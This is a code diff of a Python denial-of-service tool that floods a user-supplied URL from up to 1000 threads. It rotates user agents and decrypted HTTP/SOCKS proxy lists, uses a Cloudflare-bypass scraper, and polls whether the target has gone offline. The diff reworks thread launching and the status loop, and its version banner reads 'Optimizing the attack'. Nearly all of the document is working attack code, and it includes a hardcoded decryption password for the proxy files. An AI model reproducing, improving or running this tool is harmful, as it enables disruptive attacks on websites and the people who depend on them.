@@ -1,4 +1,5 @@
 import time
+
 import colorama
 import threading
 import random
@@ -6,17 +7,16 @@ import requests
 import cfscrape
 import os
 import pyAesCrypt
-from numba import prange
 
 os.system("clear")
 
 s = cfscrape.create_scraper()
 
-# Получение User-Agent
+#Получение User-Agent
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
 
-# Расшифровка прокси
+#Расшифровка прокси
 filedecrypthttp = "proxyhttp.crp"
 filedecryptsocks = "proxysocks.crp"
 password = "0xdrqdsdwgfegvefgtruoobcdsm"
@@ -25,36 +25,20 @@ password = "0xdrqdsdwgfegvefgtruoobcdsm"
 def decryptionhttp():
     buffer_size = 512 * 1024
     pyAesCrypt.decryptFile(str(filedecrypthttp), str(os.path.splitext(filedecrypthttp)[0]), password, buffer_size)
-
-
 decryptionhttp()
 
 with open('proxyhttp') as file:
     proxy_http = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxyhttp")
 
-
 def decryptionsocks():
     buffer_size = 512 * 1024
     pyAesCrypt.decryptFile(str(filedecryptsocks), str(os.path.splitext(filedecryptsocks)[0]), password, buffer_size)
-
-
 decryptionsocks()
 
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
-
-
-# Запуск потоков
-def dospause1(barrier, url):
-    barrier.wait()
-    dos1(url)
-
-
-def dospause2(barrier, url):
-    barrier.wait()
-    dos2(url)
 
 
 def dos1(target):
@@ -117,7 +101,8 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.6; Fixed bugs \n")
+print("Version: 1.6.4; Optimizing the attack \n")
+
 
 url = input("URL: ")
 if not url.__contains__("http"):
@@ -134,40 +119,30 @@ except ValueError:
 if threads == 0 or threads > 1000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
-bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
-if proxyuseage == 1:
+if (proxyuseage == 1):
     for i in range(0, threads):
-        thr = threading.Thread(target=dospause1, args=(bar, url,))
+        thr = threading.Thread(target=dos1, args=(url,))
         thr.start()
 else:
     for i in range(0, threads):
-        thr2 = threading.Thread(target=dospause2, args=(bar, url,))
+        thr2 = threading.Thread(target=dos2, args=(url,))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
 
 while True:
+    useragent = random.choice(headersp)
+    proxyagenthttp = random.choice(proxy_http)
+
     try:
-        useragent5 = random.choice(headersp)
-        proxyagenthttp3 = random.choice(proxy_http)
-        checksite = requests.post(url, headers={'user-agent': useragent5},
-                                  proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
+        checksite = requests.post(url, headers={'user-agent': useragent}, proxies={'http': f'http://{proxyagenthttp}', 'https': f'http://{proxyagenthttp}'})
+        if checksite.status_code >= 500:
+            statustext = "OFF_LINE"
+        else:
+            statustext = "ON_LINE"
     except:
-        useragent5 = random.choice(headersp)
-        proxyagenthttp3 = random.choice(proxy_http)
-        checksite = requests.post(url, headers={'user-agent': useragent5},
-                                  proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
         pass
-
-    if checksite.status_code >= 500:
-        statustext = "OFF_LINE"
-    else:
-        statustext = "ON_LINE"
-
-    print("\r Check Site | Status: " + str(checksite.status_code) + " | " + str(statustext), end='')
-
-    time.sleep(1)
-
+    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
